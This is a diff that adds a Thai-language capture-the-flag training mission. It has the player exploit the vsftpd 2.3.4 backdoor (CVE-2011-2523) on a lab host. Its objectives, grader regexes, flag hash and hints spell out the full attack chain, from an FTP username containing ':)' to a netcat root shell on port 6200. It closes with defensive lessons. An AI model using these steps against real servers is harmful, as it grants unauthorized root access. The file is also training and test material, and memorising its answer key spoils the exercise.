@@ -1,0 +1,78 @@
+{
+  "id": "c06-m01",
+  "chapter": "c06",
+  "title": "Backdoor ลืมปิด: vsftpd 2.3.4 บน legacy01",
+  "difficulty": "medium",
+  "xp": 400,
+  "estMinutes": 20,
+  "lesson": "c06-l01",
+  "briefing": "ทีม IT ของ ACME เจอเครื่อง 10.10.20.15 (legacy01) โดยบังเอิญระหว่างทำ inventory — ไม่มีใครรู้ว่ามันยังเปิดอยู่ ใช้ nmap ตรวจสอบ service แล้วหา exploit ที่เหมาะสมด้วย searchsploit จากนั้นใช้ช่องโหว่นั้นเข้าควบคุมเครื่องและนำ flag กลับมา",
+  "scope": {
+    "inScope": [
+      "legacy01 — 10.10.20.15"
+    ],
+    "outOfScope": [
+      "เครื่องอื่นทั้งหมด"
+    ],
+    "ips": [
+      "10.10.20.15"
+    ]
+  },
+  "machine": "training-box",
+  "network": "lab",
+  "startUser": "kali",
+  "reachableMachines": [
+    { "ip": "10.10.20.15", "machine": "legacy01" }
+  ],
+  "objectives": [
+    {
+      "id": "o1",
+      "text": "สแกน legacy01 ด้วย nmap -sV -sC เพื่อดูเวอร์ชันและ script ตรวจช่องโหว่",
+      "type": "command",
+      "match": "^nmap\\b.*-s[VC].*10\\.10\\.20\\.15|^nmap\\b.*10\\.10\\.20\\.15.*-s[VC]"
+    },
+    {
+      "id": "o2",
+      "text": "ใช้ searchsploit ค้นหา exploit ของ vsftpd 2.3.4",
+      "type": "command",
+      "match": "^searchsploit\\b.*vsftpd"
+    },
+    {
+      "id": "o3",
+      "text": "เปิด session ftp ไปยัง legacy01 แล้วใช้ username ที่มีเครื่องหมาย \":)\" เพื่อกระตุ้น backdoor",
+      "type": "event",
+      "name": "ftp.backdoor",
+      "where": { "host": "^10\\.10\\.20\\.15$" }
+    },
+    {
+      "id": "o4",
+      "text": "เชื่อมต่อไปยังพอร์ต 6200 ที่ backdoor เปิดไว้เพื่อรับ root shell",
+      "type": "shell",
+      "host": "legacy01",
+      "user": "root"
+    },
+    {
+      "id": "o5",
+      "text": "อ่านไฟล์ /root/flag.txt แล้วส่ง flag",
+      "type": "flag",
+      "flagHash": "c60fd97eeeb33123f4c6d5d32cf1c486039e813f0ad555b21916f033c2cf27de"
+    }
+  ],
+  "hints": [
+    { "cost": 10, "text": "`nmap -sV -sC -p21 10.10.20.15` — ดู script ftp-vuln-cve2011-2523 ในผลลัพธ์" },
+    { "cost": 15, "text": "`searchsploit vsftpd 2.3.4` จะเจอ \"vsftpd 2.3.4 - Backdoor Command Execution\"" },
+    { "cost": 25, "text": "`ftp 10.10.20.15` แล้วตอน Name ใส่อะไรก็ได้ที่มี `:)` อยู่ เช่น `hacker:)`" },
+    { "cost": 35, "text": "หลังกระตุ้น backdoor แล้ว ftp session จะจบไปเลย (ไม่ต้องใส่ password) — เปิด connection ใหม่ด้วย `nc 10.10.20.15 6200`" }
+  ],
+  "debrief": [
+    "backdoor นี้คือ CVE-2011-2523 — ไม่ใช่ช่องโหว่จากการเขียนโค้ดผิดพลาด แต่เป็นโค้ดอันตรายที่ถูกแทรกเข้าไปในไฟล์แจกจ่ายโดยตรง (supply-chain compromise) เครื่องไหนก็ตามที่ดาวน์โหลดเวอร์ชันที่ติดเชื้อมาติดตั้งจะมีช่องโหว่นี้ทันทีโดยไม่เกี่ยวกับการตั้งค่า",
+    "ความเสี่ยงจริงอยู่ที่ \"เครื่องลืมปิด\": เซิร์ฟเวอร์ที่ไม่มีใครดูแลแล้วแต่ยังเปิด service อยู่ มักไม่ได้รับการอัปเดตความปลอดภัยและไม่มีใครตรวจสอบ log ของมัน เป็นเหตุผลที่ asset inventory ที่แม่นยำสำคัญมากในองค์กรจริง",
+    "ฝั่งป้องกัน: ตรวจสอบ checksum/signature ของไฟล์ติดตั้งก่อนใช้งานเสมอ, ทำ asset inventory สม่ำเสมอเพื่อไม่ให้มีเครื่อง \"ลืมปิด\", และปิด service ที่ไม่ได้ใช้งานจริง"
+  ],
+  "references": [
+    "CVE-2011-2523",
+    "MITRE ATT&CK T1195 Supply Chain Compromise",
+    "MITRE ATT&CK T1210 Exploitation of Remote Services",
+    "CWE-506 Embedded Malicious Code"
+  ]
+}
